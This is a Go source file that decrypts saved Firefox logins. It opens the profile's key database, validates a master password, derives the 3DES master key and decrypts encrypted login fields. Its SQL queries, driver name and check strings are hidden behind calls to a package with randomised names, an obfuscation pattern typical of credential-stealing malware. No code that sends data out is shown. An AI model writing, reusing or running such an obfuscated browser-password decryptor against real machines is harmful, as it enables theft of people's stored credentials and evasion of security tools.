package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"errors"
	"hash"

	"Cobra/IoenQn"

	_ "github.com/mattn/go-sqlite3"
)

var passwordCheck = IoenQn.OaQ7ml0()

// Profile is the Firefox profile.
type Profile struct {
	location     string
	globalSalt   []byte
	masterPasswd []byte
	key          []byte
}

// EncryptedField represents an encrypted field (for ASN1 unmarshal).
type EncryptedField struct {
	KeyName []byte
	EncParams
	Ct []byte
}

// EncParams are encryption field encryption parameters.
type EncParams struct {
	Encryption asn1.ObjectIdentifier
	IV         []byte
}

// MasterKey describes the following ASN1 structure:
//
//      SEQUENCE {
//       SEQUENCE {
//         OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3
//         SEQUENCE {
//           OCTETSTRING entry_salt
//           INTEGER 01
//         }
//       }
//       OCTETSTRING encrypted_master_key
//     }
type MasterKey struct {
	Salt
	CipherText []byte
}

// Salt is cryptographic salt, part of MasterKey.
type Salt struct {
	CipherType asn1.ObjectIdentifier
	SaltValue
}

// SaltValue is the salt value, part of MasterKey.
type SaltValue struct {
	EntrySalt  []byte
	Iterations int
}

// New opens a firefox profile.  Will return error if master key is wrong.
func New(profilePath string, masterPassword []byte) (*Profile, error) {
	// open key database
	db, err := sql.Open(IoenQn.UNCbua1(), profilePath)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		return nil, err
	}

	p := &Profile{}
	if err := p.isMasterPassValid(db, masterPassword); err != nil {
		return nil, err
	}
	p.key, err = p.masterKey(db)
	if err != nil {
		return nil, err
	}
	return p, nil
}

func (p *Profile) isMasterPassValid(db *sql.DB, masterPassword []byte) error {
	var stmt = IoenQn.M2oYBh2()
	row := db.QueryRow(stmt)

	var item2 []byte
	if err := row.Scan(&p.globalSalt, &item2); err != nil {
		return err
	}

	var keyData MasterKey
	if _, err := asn1.Unmarshal(item2, &keyData); err != nil {
		return err
	}

	pt, err := decrypt3DES(p.globalSalt, masterPassword, keyData.EntrySalt, keyData.CipherText)
	if err != nil {
		return err
	}
	if bytes.Compare(pt, []byte(passwordCheck)) != 0 {
		return errors.New(IoenQn.J3haXV3())
	}
	// master password ok
	p.masterPasswd = masterPassword

	return nil
}

func (p *Profile) masterKey(db *sql.DB) ([]byte, error) {
	var stmt = IoenQn.Nv1LGH4()

	var a11 []byte
	rows, err := db.Query(stmt)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	for rows.Next() {
		rows.Scan(&a11)
		if a11 != nil {
			break
		}
	}

	var m MasterKey
	if _, err := asn1.Unmarshal(a11, &m); err != nil {
		return nil, err
	}

	key, err := decrypt3DES(p.globalSalt, p.masterPasswd, m.EntrySalt, m.CipherText)
	if err != nil {
		return nil, err
	}
	return key[:24], nil
}

// DecryptField decrypts the base64-encoded field from the login file.
func (p *Profile) DecryptField(ct64 string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(ct64)
	if err != nil {
		return nil, err
	}
	var field EncryptedField
	if _, err := asn1.Unmarshal(data, &field); err != nil {
		return nil, err
	}

	p.decrypt(field.Ct, field.Ct, field.IV)

	return pkcs5trim(field.Ct), nil
}

// decrypt is the low-level decrypt function that uses the profile master key
// and provided iv to decrypt the src to dst.
func (p *Profile) decrypt(dst, src, iv []byte) {
	block, _ := des.NewTripleDESCipher(p.key)
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(dst, src)
}

// hmacHash calculates hmac hash of the provided data.
func hmacHash(h func() hash.Hash, key []byte, data []byte) []byte {
	hasher := hmac.New(h, key)
	hasher.Write(data)
	return hasher.Sum(nil)
}

// decrypt3DES decrypts the ciphertext provided salts and master pwd.
// Returns plain text and error.
func decrypt3DES(globalSalt, masterPassword, entrySalt, ct []byte) ([]byte, error) {
	hp := sha1.Sum(append(globalSalt, masterPassword...))
	chp := sha1.Sum(append(hp[:], entrySalt...))

	pes := append(entrySalt, bytes.Repeat([]byte{0}, 20-len(entrySalt))...)
	k1 := hmacHash(sha1.New, chp[:], append(pes, entrySalt...))
	tk := hmacHash(sha1.New, chp[:], pes)
	k2 := hmacHash(sha1.New, chp[:], append(tk, entrySalt...))
	k := append(k1, k2...)

	iv := k[len(k)-8:]
	key := k[:24]

	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ct, ct)
	return ct, nil
}

// pkcs5trim implements PKCS#5 trimming.
func pkcs5trim(pt []byte) []byte {
	padSz := pt[len(pt)-1]
	if int(padSz) > len(pt) {
		return pt
	}
	return pt[:len(pt)-int(padSz)]
}
